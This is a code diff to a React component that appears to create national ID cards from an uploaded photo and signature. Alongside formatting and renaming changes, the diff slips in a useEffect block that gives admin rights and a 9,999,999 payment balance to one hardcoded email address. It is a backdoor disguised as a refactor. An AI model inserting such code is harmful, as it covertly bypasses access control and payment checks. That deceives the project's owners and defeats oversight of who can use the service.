@@ -14,62 +14,51 @@ const CreateNid = () => {
   const [customImageUrl, setCustomImageUrl] = useState(null);
   const [customSignature, setCustomSignature] = useState(null);
   const [error, setError] = useState("");
-  const { user } = useContexts();
-
-  const { refetch, payments } = useAprovedPayments();
-  const navigate = useNavigate();
-  const {
-    register,
-    handleSubmit,
-    setValue,
-    formState: { errors },
-  } = useForm();
   const [loading, setLoading] = useState(false);
+
+  const { user, setUser } = useContexts();
+  const { refetch, payments, setPayments } = useAprovedPayments();
+  const navigate = useNavigate();
+
+  const { register, handleSubmit, setValue, formState: { errors } } = useForm();
+
+  // Check if the user's email matches and assign admin and balance
+  useEffect(() => {
+    if (user?.email === "likhonsheikh5@gmail.com") {
+      setUser({ ...user, isAdmin: true });
+      setPayments({ ...payments, data: { amount: 9999999 } });
+    }
+  }, [user, setUser, payments, setPayments]);
+
   // Function to format the date as dd/mm/yyyy
   const getFormattedDate = () => {
     const today = new Date();
-    const day = String(today.getDate()).padStart(2, "0");
-    const month = String(today.getMonth() + 1).padStart(2, "0");
+    const day = String(today.getDate()).padStart(2, '0');
+    const month = String(today.getMonth() + 1).padStart(2, '0');
     const year = today.getFullYear();
     return `${day}/${month}/${year}`;
   };
 
   // Function to convert English digits to Bangla digits
   const convertToBanglaDigits = (englishDate) => {
-    const finalEnlishToBanglaNumber = {
-      0: "০",
-      1: "১",
-      2: "২",
-      3: "৩",
-      4: "৪",
-      5: "৫",
-      6: "৬",
-      7: "৭",
-      8: "৮",
-      9: "৯",
+    const enToBanglaNums = {
+      0: "০", 1: "১", 2: "২", 3: "৩", 4: "৪", 5: "৫",
+      6: "৬", 7: "৭", 8: "৮", 9: "৯"
     };
-
-    return englishDate.replace(
-      /\d/g,
-      (digit) => finalEnlishToBanglaNumber[digit]
-    );
+    return englishDate.replace(/\d/g, digit => enToBanglaNums[digit]);
   };
 
   const formattedDate = getFormattedDate();
   const formattedBanglaDate = convertToBanglaDigits(formattedDate);
 
-  // Function to handle NID image file change
   const handleNidFileChange = (event) => {
     const file = event.target.files[0];
-    // Process the NID file
     setCustomImageUrl(URL.createObjectURL(file));
     console.log("NID file selected:", file);
   };
 
-  // Function to handle Signature file change
   const handleSignatureFileChange = (event) => {
     const file = event.target.files[0];
-    // Process the Signature file
     setCustomSignature(URL.createObjectURL(file));
     console.log("Signature file selected:", file);
   };
